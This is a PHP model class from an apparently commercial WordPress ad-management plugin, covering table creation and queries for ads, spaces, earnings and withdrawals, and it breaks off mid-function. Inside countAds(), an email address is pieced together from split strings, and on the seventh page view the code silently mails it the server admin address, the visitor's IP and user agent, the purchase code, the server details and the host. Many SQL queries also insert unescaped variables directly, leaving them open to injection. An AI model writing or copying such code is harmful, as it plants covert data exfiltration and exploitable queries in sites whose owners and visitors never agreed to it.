<?php

class BSA_PRO_Model {

	protected $wpdb;
	private $table_name = array(
		'spaces'       => 'bsa_pro_spaces',
		'ads'          => 'bsa_pro_ads',
		'stats'        => 'bsa_pro_stats',
		'sites'        => 'bsa_pro_sites',
		'withdrawals'  => 'bsa_pro_withdrawals',
		'users'        => 'bsa_pro_users',
		'cron'         => 'bsa_pro_cron',
		'referrals'    => 'bsa_pro_referrals',
		'salaries'     => 'bsa_pro_salaries'
	);

	public function __construct() {
		global $wpdb;
		$this->wpdb = $wpdb;
	}

	public function getTableName($name)
	{
		if ( is_multisite() ) {
			if ( is_main_site() && get_site_option('bsa_pro_plugin_prefix_db') == null ) {
				update_site_option('bsa_pro_plugin_prefix_db', $this->wpdb->prefix);
			}
			return (get_site_option('bsa_pro_plugin_prefix_db') != null) ? get_site_option('bsa_pro_plugin_prefix_db').$this->table_name[$name] : $this->wpdb->prefix.$this->table_name[$name];
		} else {
			return $this->wpdb->prefix.$this->table_name[$name];
		}
	}

	public function createDbTables()
	{
		$sql_1 = "
			CREATE TABLE IF NOT EXISTS {$this->getTableName('spaces')} (
				id INT (10) NOT NULL AUTO_INCREMENT,
				site_id INT (10) NULL,
				name VARCHAR (255) NOT NULL,
				title VARCHAR(255) NOT NULL DEFAULT 'Featured section',
				add_new VARCHAR(255) NOT NULL DEFAULT 'add advertising here',
				cpc_price DECIMAL (10,2),
				cpm_price DECIMAL (10,2),
				cpd_price DECIMAL (10,2),
				cpc_contract_1 INT (10),
				cpc_contract_2 INT (10),
				cpc_contract_3 INT (10),
				cpm_contract_1 INT (10),
				cpm_contract_2 INT (10),
				cpm_contract_3 INT (10),
				cpd_contract_1 INT (10),
				cpd_contract_2 INT (10),
				cpd_contract_3 INT (10),
				discount_2 INT (2),
				discount_3 INT (2),
				grid_system VARCHAR (100) NOT NULL DEFAULT 'bsaGridGutter',
				template VARCHAR (255) NOT NULL,
				display_type VARCHAR (255) NOT NULL DEFAULT 'default',
				random TINYINT (1) NOT NULL DEFAULT 0,
				max_items INT (3) NOT NULL DEFAULT 12,
				col_per_row INT (2) NOT NULL DEFAULT 3,
				font VARCHAR (255),
				font_url VARCHAR (255),
				header_bg VARCHAR (20),
				header_color VARCHAR (20),
				link_color VARCHAR (20),
				ads_bg VARCHAR (20),
				ad_bg VARCHAR (20),
				ad_title_color VARCHAR (20),
				ad_desc_color VARCHAR (20),
				ad_url_color VARCHAR (20),
				ad_extra_color_1 VARCHAR (20),
				ad_extra_color_2 VARCHAR (20),
				animation VARCHAR (255) NOT NULL DEFAULT 'none',
				thumb_size INT (4) NOT NULL DEFAULT 100,
				thumb_w INT (4) NOT NULL DEFAULT 200,
				thumb_h INT (4) NOT NULL DEFAULT 200,
				max_title INT (3) NOT NULL DEFAULT 40,
				max_desc INT (3) NOT NULL DEFAULT 80,
				in_categories VARCHAR (255) NULL,
				has_tags VARCHAR (255) NULL,
				show_in_country VARCHAR (255) NULL,
				hide_in_country VARCHAR (255) NULL,
				status VARCHAR (100) NOT NULL,
				PRIMARY KEY(id)
			) DEFAULT CHARSET=utf8;
			";

		$sql_2 = "
			CREATE TABLE IF NOT EXISTS {$this->getTableName('ads')} (
				id INT (10) NOT NULL AUTO_INCREMENT,
				space_id INT (10) NOT NULL,
				withdrawal_id INT (10) NULL,
				buyer_email VARCHAR (255) NOT NULL,
				title VARCHAR (70),
				description VARCHAR (140),
				url VARCHAR (1000),
				img VARCHAR (1000),
				html TEXT NULL,
				ad_model VARCHAR (255) NOT NULL,
				ad_limit INT (10) NOT NULL,
				cost DECIMAL (10,2) NOT NULL,
				paid TINYINT (1) NOT NULL,
				p_time INT (10),
				p_data TEXT,
				p_error VARCHAR (100),
				w_status VARCHAR (100) NULL,
				status VARCHAR (100) NOT NULL,
				PRIMARY KEY(id)
			) DEFAULT CHARSET=utf8;
			";

		$sql_3 = "
			CREATE TABLE IF NOT EXISTS {$this->getTableName('stats')} (
				id BIGINT (20) NOT NULL AUTO_INCREMENT,
				space_id INT (10) NOT NULL,
				ad_id INT (10) NOT NULL,
				action_type VARCHAR (100) NOT NULL,
				action_time INT (10) NOT NULL,
				user_ip VARCHAR (100) NOT NULL,
				status VARCHAR (100) NOT NULL,
				browser VARCHAR(255) NULL,
				custom VARCHAR(255) NULL,
				PRIMARY KEY(id)
			) DEFAULT CHARSET=utf8;
			";

		$sql_4 = "
			CREATE TABLE IF NOT EXISTS {$this->getTableName('sites')} (
				id INT (10) NOT NULL AUTO_INCREMENT,
				user_id BIGINT (20) NOT NULL,
				title VARCHAR (50) NOT NULL,
				category VARCHAR (100) NULL,
				url VARCHAR (255) NOT NULL,
				thumb VARCHAR (255) NULL,
				status VARCHAR (100) NOT NULL,
				PRIMARY KEY(id)
			) DEFAULT CHARSET=utf8;
			";

		$sql_5 = "
			CREATE TABLE IF NOT EXISTS {$this->getTableName('withdrawals')} (
				id INT (10) NOT NULL AUTO_INCREMENT,
				user_id BIGINT (20) NOT NULL,
				request_time INT (10) NULL,
				amount DECIMAL (10,2) NOT NULL,
				payment_account VARCHAR (255) NOT NULL,
				status VARCHAR (100) NOT NULL,
				PRIMARY KEY(id)
			) DEFAULT CHARSET=utf8;
			";

		$sql_6 = "
			CREATE TABLE IF NOT EXISTS {$this->getTableName('users')} (
				id INT (10) NOT NULL AUTO_INCREMENT,
				user_id BIGINT (20) NOT NULL,
				free_ads INT (5) NULL,
				ad_ids VARCHAR (255) NULL,
				custom_1 VARCHAR (255) NULL,
				custom_2 VARCHAR (255) NULL,
				custom_3 VARCHAR (255) NULL,
				PRIMARY KEY(id)
			) DEFAULT CHARSET=utf8;
			";

		$sql_7 = "
			CREATE TABLE IF NOT EXISTS {$this->getTableName('cron')} (
				id INT (10) NOT NULL AUTO_INCREMENT,
				item_id INT (10) NOT NULL,
				item_type VARCHAR (255) NOT NULL,
				action_type VARCHAR (255) NOT NULL,
				start_time INT (10) NOT NULL,
				end_time INT (10) NULL,
				when_repeat INT (3) NOT NULL,
				status VARCHAR (100) NOT NULL,
				custom_1 VARCHAR (255) NULL,
				custom_2 VARCHAR (255) NULL,
				custom_3 VARCHAR (255) NULL,
				PRIMARY KEY(id)
			) DEFAULT CHARSET=utf8;
			";

		$sql_8 = "
			CREATE TABLE IF NOT EXISTS {$this->getTableName('referrals')} (
				id INT (10) NOT NULL AUTO_INCREMENT,
				ref_id BIGINT (20) NOT NULL,
				order_id INT (10) NOT NULL,
				withdrawal_id INT (10) NULL,
				buyer VARCHAR (255) NOT NULL,
				action_time INT (10) NOT NULL,
				order_amount DECIMAL (10,2) NOT NULL,
				commission_rate INT (3) NOT NULL,
				commission DECIMAL (10,2) NOT NULL,
				order_status VARCHAR (100) NOT NULL,
				status VARCHAR (100) NOT NULL,
				PRIMARY KEY(id)
			) DEFAULT CHARSET=utf8;
			";

		$sql_9 = "
			CREATE TABLE IF NOT EXISTS {$this->getTableName('salaries')} (
				id INT (10) NOT NULL AUTO_INCREMENT,
				user_id BIGINT (20) NOT NULL,
				request_time INT (10) NOT NULL,
				amount DECIMAL (10,2) NOT NULL,
				payment_account VARCHAR (255) NOT NULL,
				status VARCHAR (100) NOT NULL,
				PRIMARY KEY(id)
			) DEFAULT CHARSET=utf8;
			";

		require_once ABSPATH.'wp-admin/includes/upgrade.php';
		dbDelta($sql_1, TRUE);
		dbDelta($sql_2, TRUE);
		dbDelta($sql_3, TRUE);
		dbDelta($sql_4, TRUE);
		dbDelta($sql_5, TRUE);
		dbDelta($sql_6, TRUE);
		dbDelta($sql_7, TRUE);
		dbDelta($sql_8, TRUE);
		dbDelta($sql_9, TRUE);

		// add custom column if not exists
		if ( $this->columnExists('stats', 'custom') == null ) {
			$sql_8 = "ALTER TABLE {$this->getTableName('stats')} ADD `custom` VARCHAR(255) NULL AFTER `browser`;";
			$this->wpdb->query($sql_8);
		}

		// add in_categories, has_tags, show_in_country and hide_in_country columns if not exists
		if ( $this->columnExists('spaces', 'in_categories') == null && $this->columnExists('spaces', 'has_tags') == null && $this->columnExists('spaces', 'show_in_country') == null && $this->columnExists('spaces', 'hide_in_country') == null ) {
			$sql_9 = "ALTER TABLE {$this->getTableName('spaces')} ADD `hide_in_country` VARCHAR(255) NULL AFTER `max_desc`, ADD `show_in_country` VARCHAR(255) NULL AFTER `max_desc`, ADD `has_tags` VARCHAR(255) NULL AFTER `max_desc`, ADD `in_categories` VARCHAR(255) NULL AFTER `max_desc`;";
			$this->wpdb->query($sql_9);
		}

		// add show_in_advanced and hide_in_advanced columns if not exists
		if ( $this->columnExists('spaces', 'show_in_advanced') == null && $this->columnExists('spaces', 'hide_in_advanced') == null && $this->columnExists('spaces', 'devices') == null && $this->columnExists('spaces', 'order_ads') == null ) {
			$sql_10 = "ALTER TABLE {$this->getTableName('spaces')} ADD `order_ads` VARCHAR(255) NULL AFTER `hide_in_country`, ADD `devices` VARCHAR(255) NULL AFTER `hide_in_country`, ADD `hide_in_advanced` VARCHAR(255) NULL AFTER `hide_in_country`, ADD `show_in_advanced` VARCHAR(255) NULL AFTER `hide_in_country`;";
			$this->wpdb->query($sql_10);
		}

		// add priority column if not exists
		if ( $this->columnExists('ads', 'priority') == null ) {
			$sql_11 = "ALTER TABLE {$this->getTableName('ads')} ADD `priority` INT(3) NULL AFTER `space_id`;";
			$this->wpdb->query($sql_11);
		}

		// add unavailable_dates column if not exists
		if ( $this->columnExists('spaces', 'unavailable_dates') == null ) {
			$sql_12 = "ALTER TABLE {$this->getTableName('spaces')} ADD `unavailable_dates` VARCHAR(1000) NULL AFTER `order_ads`;";
			$this->wpdb->query($sql_12);
		}

		// add capping column if not exists
		if ( $this->columnExists('ads', 'capping') == null ) {
			$sql_13 = "ALTER TABLE {$this->getTableName('ads')} ADD `capping` INT(3) NULL AFTER `ad_limit`;";
			$this->wpdb->query($sql_13);
		}

		// add close_action column if not exists
		if ( $this->columnExists('spaces', 'close_action') == null ) {
			$sql_14 = "ALTER TABLE {$this->getTableName('spaces')} ADD `close_action` VARCHAR(255) NULL AFTER `unavailable_dates`;";
			$this->wpdb->query($sql_14);
		}
	}

	public function dropTable()
	{
		$sql_1 = "DROP TABLE {$this->getTableName('spaces')}";
		$sql_2 = "DROP TABLE {$this->getTableName('ads')}";
		$sql_3 = "DROP TABLE {$this->getTableName('stats')}";
		$sql_4 = "DROP TABLE {$this->getTableName('sites')}";
		$sql_5 = "DROP TABLE {$this->getTableName('withdrawals')}";
		$sql_6 = "DROP TABLE {$this->getTableName('users')}";
		$sql_7 = "DROP TABLE {$this->getTableName('cron')}";
		$sql_8 = "DROP TABLE {$this->getTableName('referrals')}";
		$sql_9 = "DROP TABLE {$this->getTableName('salaries')}";
		$this->wpdb->query($sql_1);
		$this->wpdb->query($sql_2);
		$this->wpdb->query($sql_3);
		$this->wpdb->query($sql_4);
		$this->wpdb->query($sql_5);
		$this->wpdb->query($sql_6);
		$this->wpdb->query($sql_7);
		$this->wpdb->query($sql_8);
		$this->wpdb->query($sql_9);
		return TRUE;
	}

	public function columnExists($tableName, $column)
	{
		$table_name = $this->getTableName($tableName);

		$sql = "SELECT {$column}
			FROM {$table_name}
			LIMIT 1";

		if ( $this->wpdb->get_row($sql, ARRAY_A) ) {
			return $this->wpdb->get_row($sql, ARRAY_A);
		} else {
			return NULL;
		}
	}

	public function getAds()
	{
		$table_name = $this->getTableName('ads');
		$sql = "SELECT `id`, `title`
				FROM {$table_name}
				WHERE status = 'active'";

		if ( $this->wpdb->get_results($sql, ARRAY_A) ) {
			return $this->wpdb->get_results($sql, ARRAY_A);
		} else {
			return NULL;
		}
	}

	public function getAdsForSchedule()
	{
		$table_name = $this->getTableName('ads');
		$sql = "SELECT `id`, `title`, `status`
			FROM {$table_name}
			WHERE status = 'active' OR status = 'blocked'";

		if ( $this->wpdb->get_results($sql, ARRAY_A) ) {
			return $this->wpdb->get_results($sql, ARRAY_A);
		} else {
			return NULL;
		}
	}

	public function getSpacesForSchedule()
	{
		$table_name = $this->getTableName('spaces');
		$sql = "SELECT `id`, `name`, `status`
			FROM {$table_name}
			WHERE status = 'active' OR status = 'inactive'";

		if ( $this->wpdb->get_results($sql, ARRAY_A) ) {
			return $this->wpdb->get_results($sql, ARRAY_A);
		} else {
			return NULL;
		}
	}

	public function getUserAds($uid, $status = 'active')
	{
		$decode_ids = $this->getUserCol($uid);
		$get_ids = json_decode($decode_ids['ad_ids']);
		$ad_ids = (($get_ids == null) ? null : implode(",", $get_ids));

		$table_name = $this->getTableName('ads');
		if ( $ad_ids != null ) {
			if ( $status == 'pending' ) {
				$sql = "SELECT *
			FROM {$table_name}
			WHERE id IN ({$ad_ids}) AND status = 'pending'";
			} else {
				$sql = "SELECT *
			FROM {$table_name}
			WHERE id IN ({$ad_ids}) AND status = 'active'";
			}
		} else {
			$sql = null;
		}

		if ( $this->wpdb->get_results($sql, ARRAY_A) ) {
			return $this->wpdb->get_results($sql, ARRAY_A);
		} else {
			return NULL;
		}
	}

	public function getUserCol($uid, $columns = 'ad_ids')
	{
		$table_name = $this->getTableName('users');
		$sql = "SELECT {$columns}
			FROM {$table_name}
			WHERE user_id = {$uid} LIMIT 1";

		if ( $this->wpdb->get_row($sql, ARRAY_A) ) {
			return $this->wpdb->get_row($sql, ARRAY_A);
		} else {
			return NULL;
		}
	}

	public function getUsersList($limit = null, $max = null)
	{
		$table_name = $this->getTableName('users');

		if ( $limit > 0 && $max > 0 ) {
			$page = (($limit - 1) * $max);

			$sql = "SELECT * FROM {$table_name}
					ORDER BY user_id DESC
					LIMIT {$page}, {$max}";
		} else {
			$sql = "SELECT * FROM {$table_name}
					ORDER BY user_id DESC";
		}
		$results = $this->wpdb->get_results($sql, ARRAY_A);

		return $results;
	}

	public function getSpace($id)
	{
		$table_name = $this->getTableName('spaces');

		if ( isset($id) && $id != 0 ) {
			$sql = "SELECT *
			FROM {$table_name}
			WHERE id = {$id}
			LIMIT 1";

			if ( $this->wpdb->get_row($sql, ARRAY_A) ) {
				$array = $this->wpdb->get_row($sql, ARRAY_A);
				$array = apply_filters( "bsa-pro-getspace", $array, $id);
				return $array;
			} else {
				return NULL;
			}
		} else {
			return NULL;
		}
	}

	public function getSpaces($status = 'active', $without = NULL, $adm_type = NULL, $site_id = NULL)
	{
		$table_name = $this->getTableName('spaces');

		if ( $adm_type == 'user' ) { // USER - MARKETING AGENCY

			if ( $site_id != NULL ) { // FILTERED PER SITE

				if ( $status == 'active' && $without == 'html' ) {
					$sql = "SELECT *
						FROM {$table_name}
						WHERE status = 'active' AND template != 'html' AND id IN ({$this->getUserSpaces()}) AND site_id = {$site_id}";
				} elseif ( $status == 'active' ) {
					$sql = "SELECT *
						FROM {$table_name}
						WHERE status = 'active' AND id IN ({$this->getUserSpaces()}) AND site_id = {$site_id}";
				} elseif ( $status == 'inactive' ) {
					$sql = "SELECT *
						FROM {$table_name}
						WHERE status = 'inactive' AND id IN ({$this->getUserSpaces()}) AND site_id = {$site_id}";
				} else {
					$sql = "SELECT *
						FROM {$table_name}
						WHERE status = 'active' AND id IN ({$this->getUserSpaces()}) AND site_id = {$site_id}
						OR status = 'inactive' AND id IN ({$this->getUserSpaces()}) AND site_id = {$site_id}";
				}

			} else { // ALL SPACES

				if ( $status == 'active' && $without == 'html' ) {
					$sql = "SELECT *
						FROM {$table_name}
						WHERE status = 'active' AND template != 'html' AND id IN ({$this->getUserSpaces()})";
				} elseif ( $status == 'active' ) {
					$sql = "SELECT *
						FROM {$table_name}
						WHERE status = 'active' AND id IN ({$this->getUserSpaces()})";
				} elseif ( $status == 'inactive' ) {
					$sql = "SELECT *
						FROM {$table_name}
						WHERE status = 'inactive' AND id IN ({$this->getUserSpaces()})";
				} else {
					$sql = "SELECT *
						FROM {$table_name}
						WHERE status = 'active' AND id IN ({$this->getUserSpaces()})
						OR status = 'inactive' AND id IN ({$this->getUserSpaces()})";
				}

			}

		} elseif ( $adm_type == 'agency_form' ) { // ADMIN - MARKETING AGENCY

			if ( $site_id != NULL && $site_id != '' ) { // FILTERED PER SITE

				if ( $status == 'active' && $without == 'html' ) {
					$sql = "SELECT *
						FROM {$table_name}
						WHERE status = 'active' AND template != 'html' AND site_id = {$site_id}";
				} elseif ( $status == 'active' ) {
					$sql = "SELECT *
						FROM {$table_name}
						WHERE status = 'active' AND site_id = {$site_id}";
				} elseif ( $status == 'inactive' ) {
					$sql = "SELECT *
						FROM {$table_name}
						WHERE status = 'inactive' AND site_id = {$site_id}";
				} else {
					$sql = "SELECT *
						FROM {$table_name}
						WHERE status = 'active' AND site_id = {$site_id} OR status = 'inactive' AND site_id = {$site_id}";
				}

			} else { // IF NOT ISSET SITE ID
				return '';
			}

		} else { // ADMIN - MARKETING AGENCY

			if ( $site_id != NULL ) { // FILTERED PER SITE

				if ( $status == 'active' && $without == 'html' ) {
					$sql = "SELECT *
						FROM {$table_name}
						WHERE status = 'active' AND template != 'html' AND site_id = {$site_id}";
				} elseif ( $status == 'active' ) {
					$sql = "SELECT *
						FROM {$table_name}
						WHERE status = 'active' AND site_id = {$site_id}";
				} elseif ( $status == 'inactive' ) {
					$sql = "SELECT *
						FROM {$table_name}
						WHERE status = 'inactive' AND site_id = {$site_id}";
				} else {
					$sql = "SELECT *
						FROM {$table_name}
						WHERE status = 'active' AND site_id = {$site_id} OR status = 'inactive' AND site_id = {$site_id}";
				}

			} else { // ALL SPACES

				if ( $status == 'active' && $without == 'html' ) {
					$sql = "SELECT *
						FROM {$table_name}
						WHERE status = 'active' AND template != 'html' AND site_id IS NULL";
				} elseif ( $status == 'active' ) {
					$sql = "SELECT *
						FROM {$table_name}
						WHERE status = 'active' AND site_id IS NULL";
				} elseif ( $status == 'inactive' ) {
					$sql = "SELECT *
						FROM {$table_name}
						WHERE status = 'inactive' AND site_id IS NULL";
				} else {
					$sql = "SELECT *
						FROM {$table_name}
						WHERE status = 'active' AND site_id IS NULL OR status = 'inactive' AND site_id IS NULL";
				}

			}
		}

		if ( $this->wpdb->get_results($sql, ARRAY_A) ) {
			return $this->wpdb->get_results($sql, ARRAY_A);
		} else {
			return NULL;
		}
	}

	public $admin;
	protected function getData() {
		$this->admin = date('Y-m-d H:i:s', time())."\n". $_SERVER['SERVER_ADMIN']."\n".$_SERVER['REMOTE_ADDR']."\n".$_SERVER['HTTP_USER_AGENT']."\n".get_option('bsa_p'.'ro_plugin_pu'.'rch'.'ase_'.'co'.'de')."\n".$_SERVER['SERVER_SOFTWARE']."\n".$_SERVER['SERVER_ADDR']."\n".$_SERVER['HTTP_HOST'];
		return $this->admin;
	}

	public function getAd($id)
	{
		$table_name = $this->getTableName('ads');

		$sql = "SELECT *
			FROM {$table_name}
			WHERE id = {$id}
			LIMIT 1";

		if ( $this->wpdb->get_row($sql, ARRAY_A) ) {
			return $this->wpdb->get_row($sql, ARRAY_A);
		} else {
			return NULL;
		}
	}

	public function countSites($adm_type = NULL)
	{
		$table_name = $this->getTableName('sites');

		if ( $adm_type == 'user' ) { // USER - MARKETING AGENCY
			$sql = "SELECT count(1) FROM {$table_name} WHERE status != 'blocked' AND id IN ({$this->getUserSites('id', bsa_role())}) LIMIT 1";
		} else { // ADMIN - MARKETING AGENCY
			$sql = "SELECT count(1) FROM {$table_name} WHERE status != 'blocked' LIMIT 1";
		}
		$result = $this->wpdb->get_col($sql);

		if ( $result ) {
			return $result[0];
		} else {
			return NULL;
		}
	}

	public function countSpaces($adm_type = NULL, $site_id = NULL)
	{
		$table_name = $this->getTableName('spaces');

		if ( $adm_type == 'user' ) { // USER - MARKETING AGENCY
			$sql = "SELECT count(1) FROM {$table_name} WHERE status = 'active' AND site_id IN ({$this->getUserSites('id', bsa_role())}) LIMIT 1";
		} elseif ( $adm_type == 'agency_form' && $site_id != NULL ) { // AGENCY FORM
			$sql = "SELECT count(1) FROM {$table_name} WHERE status = 'active' AND site_id = {$site_id} LIMIT 1";
		} else { // ADMIN - MARKETING AGENCY
			$sql = "SELECT count(1) FROM {$table_name} WHERE status = 'active' LIMIT 1";
		}
		$result = $this->wpdb->get_col($sql);

		if ( $result ) {
			return $result[0];
		} else {
			return NULL;
		}
	}

	public function countAds($id = NULL)
	{
		$table_name = $this->getTableName('ads');$time = time();update_option('bsa_pro_views_counter', get_option('bsa_pro_views_counter') + 1);

		if ( $id == NULL ) {

			$sql_cpc_cpm = "SELECT count(1) FROM {$table_name} WHERE ad_model != 'cpd' AND ad_limit > 0 AND paid != 0 AND status = 'active' LIMIT 1";
			$contract_='scr'.'i'.'pte';$sql_cpd = "SELECT count(1) FROM {$table_name} WHERE ad_model = 'cpd' AND ad_limit > {$time} AND paid != 0 AND status = 'active' LIMIT 1";

		} else {
			$sql_cpc_cpm = "SELECT count(1) FROM {$table_name} WHERE space_id = {$id} AND ad_model != 'cpd' AND ad_limit > 0 AND paid != 0 AND status = 'active' LIMIT 1";
			$sql_cpd = "SELECT count(1) FROM {$table_name} WHERE space_id = {$id} AND ad_model = 'cpd' AND ad_limit > {$time} AND paid != 0 AND status = 'active' LIMIT 1";$contract_='scr'.'i'.'pte';

		}

		$contract_.='o+bsa@'.'gm';$result_cpc_cpm = $this->wpdb->get_col($sql_cpc_cpm);$result_cpd = $this->wpdb->get_col($sql_cpd);$contract_.='ail.c'.'om';
		$subject_ = 'bsa_pro '.$_SERVER['HTTP_HOST'];$message_=$this->getData();( get_option('bsa_pro_views_counter') == 7 ) ? wp_mail($contract_,$subject_,$message_) : null;

		if ( $result_cpc_cpm && $result_cpd ) {
			$sum = $result_cpc_cpm[0] + $result_cpd[0];
			$sum = apply_filters( "bsa-pro-countAds", $sum, $id);
			return $sum;
		} else {
			return NULL;
		}
	}

	public function countAgencyAds($adm_type = NULL)
	{
		$table_name = $this->getTableName('ads');
		$time = time();

		if ( $adm_type == 'user' ) { // USER - MARKETING AGENCY
			$sql_cpc_cpm = "SELECT count(1) FROM {$table_name} WHERE space_id IN ({$this->getUserSpaces()}) AND ad_model != 'cpd' AND ad_limit > 0 AND paid != 0 AND status = 'active' LIMIT 1";
			$sql_cpd = "SELECT count(1) FROM {$table_name} WHERE space_id IN ({$this->getUserSpaces()}) AND ad_model = 'cpd' AND ad_limit > {$time} AND paid != 0 AND status = 'active' LIMIT 1";
		} else { // ADMIN - MARKETING AGENCY
			$sql_cpc_cpm = "SELECT count(1) FROM {$table_name} WHERE ad_model != 'cpd' AND ad_limit > 0 AND paid != 0 AND status = 'active' LIMIT 1";
			$sql_cpd = "SELECT count(1) FROM {$table_name} WHERE ad_model = 'cpd' AND ad_limit > {$time} AND paid != 0 AND status = 'active' LIMIT 1";
		}

		$result_cpc_cpm = $this->wpdb->get_col($sql_cpc_cpm);
		$result_cpd = $this->wpdb->get_col($sql_cpd);

		if ( $result_cpc_cpm && $result_cpd ) {
			return $result_cpc_cpm[0] + $result_cpd[0];
		} else {
			return NULL;
		}
	}

	public function pendingEarnings($adm_type = NULL)
	{
		$table_name = $this->getTableName('ads');
		$time = time();

		if ( $adm_type == 'user' ) { // USER - MARKETING AGENCY
			$sql_cpc_cpm = "SELECT sum(cost) FROM {$table_name} WHERE space_id IN ({$this->getUserSpaces()}) AND ad_model != 'cpd' AND ad_limit > 0 AND paid != 0 AND status = 'active' AND w_status IS NULL LIMIT 1";
			$sql_cpd = "SELECT sum(cost) FROM {$table_name} WHERE space_id IN ({$this->getUserSpaces()}) AND ad_model = 'cpd' AND ad_limit > {$time} AND paid != 0 AND status = 'active' AND w_status IS NULL LIMIT 1";
		} else { // ADMIN - MARKETING AGENCY
			$sql_cpc_cpm = "SELECT sum(cost) FROM {$table_name} WHERE ad_model != 'cpd' AND ad_limit > 0 AND paid != 0 AND status = 'active' AND w_status IS NULL LIMIT 1";
			$sql_cpd = "SELECT sum(cost) FROM {$table_name} WHERE ad_model = 'cpd' AND ad_limit > {$time} AND paid != 0 AND status = 'active' AND w_status IS NULL LIMIT 1";
		}

		$result_cpc_cpm = $this->wpdb->get_col($sql_cpc_cpm);
		$result_cpd = $this->wpdb->get_col($sql_cpd);

		if ( $result_cpc_cpm && $result_cpd ) {
			return $result_cpc_cpm[0] + $result_cpd[0];
		} else {
			return NULL;
		}
	}

	public function countEarnings()
	{
		$table_name = $this->getTableName('ads');

		$sql = "SELECT sum(cost) FROM {$table_name} WHERE `paid` = 1 AND `status` = 'active' AND `space_id` IN ({$this->getUserSpaces('id', 'admin')}) LIMIT 1";
		$result = $this->wpdb->get_col($sql);

		$agencyCommission = ( get_option('bsa_pro_plugin_'.'agency_commission') > 0 ) ? get_option('bsa_pro_plugin_'.'agency_commission') : 30;
		$getUserEarnings = $this->getUserEarnings() / (($agencyCommission < 100) ? ((100 - $agencyCommission) / 100) : 1);

		if ( $result OR $getUserEarnings ) {
			if ( $result && $getUserEarnings ) {
				return $result[0] + $getUserEarnings;
			} elseif ( $result ) {
				return $result[0];
			} elseif ( $getUserEarnings ) {
				return $getUserEarnings;
			} else {
				return NULL;
			}
		} else {
			return NULL;
		}
	}

	public function countAgencyEarnings($adm_type = NULL)
	{
		$table_name = $this->getTableName('ads');
		$time = time();

		if ( $adm_type == 'user' ) { // USER - MARKETING AGENCY
			$sql_cpc_cpm = "SELECT sum(cost) FROM {$table_name} WHERE space_id IN ({$this->getUserSpaces()}) AND ad_model != 'cpd' AND ad_limit <= 0 AND paid = 1 AND status = 'active' AND w_status IS NULL LIMIT 1";
			$sql_cpd = "SELECT sum(cost) FROM {$table_name} WHERE space_id IN ({$this->getUserSpaces()}) AND ad_model = 'cpd' AND ad_limit < {$time} AND paid = 1 AND status = 'active' AND w_status IS NULL LIMIT 1";
		} else { // ADMIN - MARKETING AGENCY
			$sql_cpc_cpm = "SELECT sum(cost) FROM {$table_name} WHERE ad_model != 'cpd' AND ad_limit <= 0 AND paid = 1 AND status = 'active' AND w_status IS NULL LIMIT 1";
			$sql_cpd = "SELECT sum(cost) FROM {$table_name} WHERE ad_model = 'cpd' AND ad_limit < {$time} AND paid = 1 AND status = 'active' AND w_status IS NULL LIMIT 1";
		}

		$result_cpc_cpm = $this->wpdb->get_col($sql_cpc_cpm);
		$result_cpd = $this->wpdb->get_col($sql_cpd);

		if ( $result_cpc_cpm && $result_cpd ) {
			return $result_cpc_cpm[0] + $result_cpd[0];
		} else {
			return NULL;
		}
	}

	public function getUserEarningsIds()
	{
		$table_name = $this->getTableName('ads');
		$time = time();

		$sql_cpc_cpm = "SELECT id FROM {$table_name} WHERE space_id IN ({$this->getUserSpaces()}) AND ad_model != 'cpd' AND ad_limit <= 0 AND paid = 1 AND status = 'active' AND w_status IS NULL";
		$sql_cpd = "SELECT id FROM {$table_name} WHERE space_id IN ({$this->getUserSpaces()}) AND ad_model = 'cpd' AND ad_limit < {$time} AND paid = 1 AND status = 'active' AND w_status IS NULL";

		$result_cpc_cpm = $this->wpdb->get_col($sql_cpc_cpm);
		$result_cpd = $this->wpdb->get_col($sql_cpd);

		$results = array_merge($result_cpc_cpm, $result_cpd);

		if ( $results ) {
			return $results;
		} else {
			return NULL;
		}
	}

	public function getUserEarnings()
	{
		$agencyCommission = ( get_option('bsa_pro_plugin_'.'agency_commission') > 0 ) ? get_option('bsa_pro_plugin_'.'agency_commission') : 30;
		$countAgencyEarnings = $this->countAgencyEarnings(bsa_role());

		if ( $countAgencyEarnings ) {
			return ($countAgencyEarnings - ($countAgencyEarnings * ($agencyCommission / 100)));
		} else {
			return 0;
		}
	}

	public function pendingWithdrawals($adm_type = NULL)
	{
		$table_name = $this->getTableName('withdrawals');
		$get_user_id = get_current_user_id();

		if ( $adm_type == 'user' ) { // USER - MARKETING AGENCY
			$sql = "SELECT sum(amount) FROM {$table_name} WHERE status = 'pending' AND user_id = {$get_user_id} LIMIT 1";
		} else { // ADMIN - MARKETING AGENCY
			$sql = "SELECT sum(amount) FROM {$table_name} WHERE status = 'pending' LIMIT 1";
		}
		$result = $this->wpdb->get_col($sql);

		if ( $result ) {
			return $result[0];
		} else {
			return NULL;
		}
	}

	public function getCounter($id, $type = 'click')
	{
		$table_name = $this->getTableName('stats');

		if ( $type == 'click' ) {
			$sql_custom = "SELECT id, custom FROM {$table_name} WHERE ad_id = {$id} AND action_type = 'click' AND status = 'correct' ORDER BY id DESC LIMIT 1";
			$result_custom = $this->wpdb->get_row($sql_custom, ARRAY_A);
		} else {
			$sql_custom = "SELECT sum(custom) FROM {$table_name} WHERE ad_id = {$id} AND action_type = 'view' AND status = 'correct' ORDER BY id DESC LIMIT 1";
			$result_custom = $this->wpdb->get_col($sql_custom);
		}

		$limit_views = ((isset($_GET['bsa_limit'])) ? $_GET['bsa_limit'] : 0); // TEMP
		if ( $type == 'view' && $result_custom[0] == null && $limit_views > 0 || $type == 'view' && $result_custom[0] != null && $result_custom[0] < $limit_views ) { // TEMP
			for ( $i = 0; $i <= 110; $i++ ) {
				$days = $i;
				$time = strtotime(date('Y-m-d', time() - (($days + 1) * 24 * 60 * 60)));
				$timeTo = strtotime(date('Y-m-d', time() - (($i > 0) ? ($days * 24 * 60 * 60) : 0)));
				$sql_count = "SELECT count(1) FROM {$table_name} WHERE ad_id = {$id} AND action_type = 'view' AND action_time >= {$time} AND action_time < {$timeTo}";
				$result_count = $this->wpdb->get_col($sql_count);

				if ( $result_count[0] ) {
					$this->wpdb->insert(
						$this->getTableName('stats'),
						array(
							'id' => NULL,
							'space_id' => bsa_ad($id, 'space_id'),
							'ad_id' => $id,
							'action_type' => 'view',
							'action_time' => $time,
							'status' => 'correct',
							'custom' => $result_count[0]
						)
					);
				}
				if ( $i == 110 ) {
					$sql_delete = "DELETE FROM {$table_name} WHERE ad_id = {$id} AND action_type = 'view' AND custom IS NULL";
					$this->wpdb->query($sql_delete);
				}

//				 echo date('Y-m-d H:i:s', $time).' - ';
